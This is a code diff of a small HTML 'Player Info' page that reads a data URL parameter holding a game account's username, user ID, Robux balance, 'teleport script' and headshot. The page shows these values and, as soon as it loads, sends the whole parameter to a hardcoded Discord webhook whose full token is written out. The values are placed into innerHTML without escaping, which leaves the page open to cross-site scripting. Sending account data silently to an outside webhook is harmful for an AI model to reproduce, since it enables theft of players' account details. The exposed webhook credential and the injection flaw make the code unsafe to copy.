@@ -3,11 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>testing</title>
+    <title>Player Info</title>
 </head>
 <body>
-    <h1>info</h1>
+    <h1>Player Info</h1>
     <div id="player-info"></div>
+    <footer>
+        <p id="footer-text"></p>
+    </footer>
     <script>
         function sendDataToWebhook(data) {
             const webhookUrl = 'https://discord.com/api/webhooks/1345195939304046663/2v1rOg93RZscRR8CFLN3pnFPARbXxZr9Bhpy1Zv3DWBwOtdy6Kb9dSQhO3Nkcdvqh6gU';
@@ -32,15 +35,20 @@
         const data = JSON.parse(decodeURIComponent(urlParams.get('data')));
 
         const playerInfoDiv = document.getElementById('player-info');
-        const embed = data.embeds[0];
-        
+        const footerText = document.getElementById('footer-text');
+        const message = data;
+
+        // Display player info
         playerInfoDiv.innerHTML = `
-            <p><strong>Username:</strong> ${embed.fields[0].value}</p>
-            <p><strong>UserID:</strong> ${embed.fields[1].value}</p>
-            <p><strong>Robux:</strong> ${embed.fields[2].value}</p>
-            <p><strong>Teleport Script:</strong> ${embed.footer.text}</p>
-            <img src="${embed.thumbnail.url}" alt="Player Headshot">
+            <p><strong>Username:</strong> ${message.username}</p>
+            <p><strong>UserID:</strong> ${message.userId}</p>
+            <p><strong>Robux:</strong> ${message.robuxAmount}</p>
+            <p><strong>Teleport Script:</strong> ${message.teleportScript}</p>
+            <img src="${message.headshotUrl}" alt="Player Headshot" width="150" height="150">
         `;
+
+        // Display footer text (Teleport Script)
+        footerText.innerHTML = `Teleport Script: ${message.teleportScript}`;
 
         sendDataToWebhook(data);
     </script>
